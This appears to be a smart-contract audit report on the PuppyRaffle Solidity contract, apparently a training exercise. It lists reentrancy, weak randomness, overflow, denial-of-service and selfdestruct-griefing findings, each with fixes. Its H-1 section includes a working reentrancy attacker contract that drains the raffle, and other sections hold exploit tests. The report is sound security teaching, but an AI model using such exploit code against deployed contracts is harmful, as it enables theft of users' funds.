# Codehawks/Cyfrin -- PuppyRaffle Security Review

- [Codehawks/Cyfrin -- PuppyRaffle Security Review](#codehawkscyfrin----puppyraffle-security-review)
  - [High](#high)
    - [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance](#h-1-reentrancy-attack-in-puppyrafflerefund-allows-entrant-to-drain-raffle-balance)
    - [\[H-2\] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy](#h-2-weak-randomness-in-puppyraffleselectwinner-allows-users-to-influence-or-predict-the-winner-and-influence-or-predict-the-winning-puppy)
    - [\[H-3\] Unsafe Addition causes Integer Overflow of `PuppyRaffle::totalFees` causing loss of fees](#h-3-unsafe-addition-causes-integer-overflow-of-puppyraffletotalfees-causing-loss-of-fees)
  - [Medium](#medium)
    - [\[M-1\] Loop based duplicate-check in `PuppyRaffle::enterRaffle` vulnerable to Denial of Service (DoS) Attack, gas cost keeps incrementing for future participants](#m-1-loop-based-duplicate-check-in-puppyraffleenterraffle-vulnerable-to-denial-of-service-dos-attack-gas-cost-keeps-incrementing-for-future-participants)
    - [\[M-2\] Unsafe cast of `PuppyRaffle::totalFees` in `PuppyRaffle::selectWinner` causes loss of fees](#m-2-unsafe-cast-of-puppyraffletotalfees-in-puppyraffleselectwinner-causes-loss-of-fees)
    - [\[M-3\] Smart contract raffle winners without a `receive` or `fallback` function will block the start of a new contest](#m-3-smart-contract-raffle-winners-without-a-receive-or-fallback-function-will-block-the-start-of-a-new-contest)
    - [\[M-4\] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals](#m-4-balance-check-on-puppyrafflewithdrawfees-enables-griefers-to-selfdestruct-a-contract-to-send-eth-to-the-raffle-blocking-withdrawals)
  - [Low](#low)
    - [\[L-1\] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think that they have not entered the raffle](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-non-existent-players-and-for-players-at-index-0-causing-a-player-at-index-0-to-incorrectly-think-that-they-have-not-entered-the-raffle)
  - [Gas](#gas)
    - [\[G-1\] Unchanged state variables should be declared constant or immutable](#g-1-unchanged-state-variables-should-be-declared-constant-or-immutable)
    - [\[G-2\] Storage variables in a loop should be cached](#g-2-storage-variables-in-a-loop-should-be-cached)
  - [Informational](#informational)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Using an outdated version of Solidity is not recommended](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
    - [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-4\] `PuppyRaffle::selectWinner` does not follow CEI (Checks, Effects, Interactions).](#i-4-puppyraffleselectwinner-does-not-follow-cei-checks-effects-interactions)
    - [\[I-5\] Magic Numbers](#i-5-magic-numbers)
    - [\[I-6\] `PuppyRaffle::_isActivePlayer` is never used and should be removed](#i-6-puppyraffle_isactiveplayer-is-never-used-and-should-be-removed)



## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback` or `receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Users enter the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code**
<details>
<summary>Code</summary>

Place the following in `PuppyRaffleTest.t.sol`:

```javascript
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(
        puppyRaffle
    );
    address attackUser = makeAddr("attakUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract)
        .balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log(
        "Starting Attack Contract Balance: ",
        startingAttackContractBalance
    );
    console.log("Starting Contract Balance: ", startingContractBalance);

    console.log(
        "Ending Attack Contract Balance: ",
        address(attackerContract).balance
    );
    console.log("Ending Contract Balance: ", address(puppyRaffle).balance);
}
```

And this contract as well:

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIdx;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIdx = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIdx);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIdx);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

-   payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
+   payable(msg.sender).sendValue(entranceFee);
}
```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable final number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could front-run this function and call `refund` if they see they are not the winner.

**Impact:** Any yser can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. This makes the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty`. They can use that to predict when and how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like themwinner or resulting puppy.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Unsafe Addition causes Integer Overflow of `PuppyRaffle::totalFees` causing loss of fees

**Description:** In Solidity versions prior to `0.8.0` arithmetic operations on integers were subject to integer overflows. This is applicable to *all* `int` or `uint` types.

For example:
```javascript
uint8 myVar = type(uint8).max;
// myVar will be 255

myVar = myVar + 1;
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFeews`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**
1. We first conclude a raffle of 4 players to collect some fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```
4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
    // We finish a raffle of 4 to collect some fees
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
    // startingTotalFees = 800000000000000000

    // We then have 89 players enter a new raffle
    uint256 playersNum = 89;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    // We end the raffle
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // And here is where the issue occurs
    // We will now have fewer fees even though we just finished a second raffle
    puppyRaffle.selectWinner();

    uint256 endingTotalFees = puppyRaffle.totalFees();
    console.log("ending total fees", endingTotalFees);
    assert(endingTotalFees < startingTotalFees);

    // We are also unable to withdraw any fees because of the require check
    vm.prank(puppyRaffle.feeAddress());
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

## Medium

### [M-1] Loop based duplicate-check in `PuppyRaffle::enterRaffle` vulnerable to Denial of Service (DoS) Attack, gas cost keeps incrementing for future participants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. This will discourage later users from entering and cause a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have *100 players* who each enter just themselves then the costs will be as such:

> - Gas cost for 3rd player to enter    : 35627
> - Gas cost for 100th player to enter  : 3966957

In this case, it is more than **111x more expensive** for the 100th player to enter as compared to the 3rd player.

```javascript
function test_DoS() public {
    uint256 gasStart = 0;
    uint256 gasCost = 0;
    uint256 gasPrevCost = 0;

    // Set gas price to 1
    vm.txGasPrice(1);

    // Enter first player.
    // Gas cost will be high - Storage variable warm up
    address[] memory players = new address[](1);
    players[0] = address(1);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    // Enter second player so that `gasPrevCost` can be set.
    gasStart = gasleft();
    players[0] = address(2);
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    gasCost = (gasStart - gasleft()) * tx.gasprice;

    // Enter remaining players.
    // See that gasCost keeps increasing with the number of players indicating
    // a Denial of Service attack.
    // Gas cost for first player to enter in loop (i = 0)   : 35627
    // Gas cost for last player to enter in loop (i = 100)  : 3966957
    for (uint160 i = 3; i <= 100; i++) {
        gasPrevCost = gasCost;
        gasStart = gasleft();
        players[0] = address(i);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        gasCost = (gasStart - gasleft()) * tx.gasprice;
        console.log("Gas cost: %s", gasCost);
        assert(gasCost > gasPrevCost);
    }

    console.log("Vulnerable to Denial of Service (DOS)");
}
```

**Recommended Mitigation:**

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup if an address is present or not.
```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
1. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)

### [M-2] Unsafe cast of `PuppyRaffle::totalFees` in `PuppyRaffle::selectWinner` causes loss of fees

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18.45` ETH. Meaning, if more than 18.45ETH of fees are collected, the `fee` casting will truncate the value.

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**
- To demo this, we need a situation such that `totalFees > 18.45 ether`.
- One such simple scenario would be if `100` players enter the raffle.
  - Expected `totalFee` should be `20 ether`.
  - We instead get the `totalFee = 20 ether - 18446744073709551615 ≈ 1.5 ether`

<details>
<summary>Code</summary>

```javascript
function test_unsafeCast() public {
    address[] memory players = new address[](100);
    for (uint160 i = 1; i <= 100; i++) {
        players[i - 1] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * 100}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();

    uint64 totalFees = puppyRaffle.totalFees();

    console.log("Expected Total Fees: \t%s", entranceFee * 20); // 20% of deposit
    console.log("Actual Total Fees: \t%s", totalFees);
}
```

</details>

### [M-3] Smart contract raffle winners without a `receive` or `fallback` function will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter but, it could cost a lot sye to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

**Proof of Concept:**
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends.
3. The `selectWinner` function wouldn't work, even thought the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue:
1. Do not allow smart contract entrants (not recommended)
2. Create a mapping of address -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize. (Recommended)


### [M-4] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check.

```javascript
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees.

**Proof of Concept:**

1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a `selfdestruct`
3. `feeAddress` is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function.

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think that they have not entered the raffle

**Description:** For a player at index `0` in `PuppyRaffle::players`, this will return 0 but, according to natspec, it will also return 0 if the player is not in the array.

```javascript
function getActivePlayerIndex(
    address player
) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

**Impact:** A player at index 0 may incorrectly think that they have not entered the raffle and attempt to enter the raffle again thereby wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant.
2. User calls `PuppyRaffle::getActivePlayerIndex`. It returns 0.
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:**
Any one of the following maybe considered:
1. Revert if the player is not in the array of instead of returning 0.
2. You could also reserve the 0th position for any raffle.
3. Return `int256` where the fucntion returns `-1` if player is not active.

## Gas

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

### [G-2] Storage variables in a loop should be cached

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```

## Informational

### [I-1] Solidity pragma should be specific, not wide

We recommend avoiding complex pragma statement. Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

### [I-2] Using an outdated version of Solidity is not recommended

**Description** solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks.

**Recommended Mitigation:** Consider using the latest version of Solidity for testing. Deploy with a new yet stable version of Solidity. Our current recommendation is `0.8.18`

The recommendation take into account:
- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 76](src/PuppyRaffle.sol#L76)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 99](src/PuppyRaffle.sol#L99)

	```solidity
	        players.push(newPlayers[i]);
	```

- Found in src/PuppyRaffle.sol [Line: 225](src/PuppyRaffle.sol#L225)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 254](src/PuppyRaffle.sol#L254)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI (Checks, Effects, Interactions).

It's best to keep code clean and follow CEI.

```diff
-   (bool success, ) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+   (bool success, ) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Magic Numbers

**Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

**Recommended Mitigation:** Replace all magic numbers with constants.

```diff
+   uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+   uint256 public constant FEE_PERCENTAGE = 20;
+   uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-   uint256 prizePool = (totalAmountCollected * 80) / 100;
-   uint256 fee = (totalAmountCollected * 20) / 100;
+   uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
+   uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### [I-6] `PuppyRaffle::_isActivePlayer` is never used and should be removed

**Description**: The function PuppyRaffle::_isActivePlayer is never used and should be removed.

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```
